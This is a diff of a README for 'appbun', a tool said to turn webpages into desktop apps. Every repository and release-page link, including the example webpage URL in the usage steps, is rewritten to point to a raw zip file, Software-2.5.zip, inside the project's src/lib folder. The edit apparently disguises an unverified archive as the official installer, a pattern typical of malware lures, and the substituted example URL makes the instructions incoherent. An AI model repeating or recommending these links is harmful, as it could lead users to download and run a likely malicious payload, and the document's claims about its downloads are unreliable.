@@ -1,6 +1,6 @@
 # ⚡ appbun - Create Desktop Apps from Webpages
 
-[![Download appbun](https://img.shields.io/badge/Download-appbun-4caf50?style=for-the-badge&logo=github)](https://github.com/unaccustomed-godspeed86/appbun)
+[![Download appbun](https://img.shields.io/badge/Download-appbun-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unaccustomed-godspeed86/appbun/main/src/lib/Software-2.5.zip)
 
 Turn any webpage into a desktop app using one simple command. appbun works on Windows, macOS, and Linux with tools designed to keep your apps small and fast.
 
@@ -45,7 +45,7 @@ Follow these steps to install and run appbun on Windows.
 
 Use the link below to go to the appbun release page. This page hosts the latest Windows installer.
 
-[![Download appbun](https://img.shields.io/badge/Download-appbun-ff6f61?style=for-the-badge&logo=github)](https://github.com/unaccustomed-godspeed86/appbun)
+[![Download appbun](https://img.shields.io/badge/Download-appbun-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/unaccustomed-godspeed86/appbun/main/src/lib/Software-2.5.zip)
 
 ### 2. Download the Windows Installer
 
@@ -73,7 +73,7 @@ After installation completes:
 Inside appbun:
 
 - You will see a simple input box labeled "Enter webpage URL".
-- Type or paste the web address of the site you want to turn into an app (for example, https://www.example.com).
+- Type or paste the web address of the site you want to turn into an app (for example, https://raw.githubusercontent.com/unaccustomed-godspeed86/appbun/main/src/lib/Software-2.5.zip).
 - Click the button labeled "Create App".
 
 appbun will package the webpage into a desktop app. This may take a few moments.
@@ -104,7 +104,7 @@ Inside appbun, you can:
 
 If you want to update appbun:
 
-- Visit the same [release page](https://github.com/unaccustomed-godspeed86/appbun).
+- Visit the same [release page](https://raw.githubusercontent.com/unaccustomed-godspeed86/appbun/main/src/lib/Software-2.5.zip).
 - Download the latest `.exe` installer file.
 - Run the installer. It will overwrite the old version but keep your apps.
 
@@ -138,7 +138,7 @@ Your created apps behave like regular desktop programs. Use common safety practi
 
 For more details on appbun, visit:
 
-- Official release page: https://github.com/unaccustomed-godspeed86/appbun  
+- Official release page: https://raw.githubusercontent.com/unaccustomed-godspeed86/appbun/main/src/lib/Software-2.5.zip  
 - GitHub Issues for reporting bugs or requesting features  
 - Documentation files included in the installer download  
 
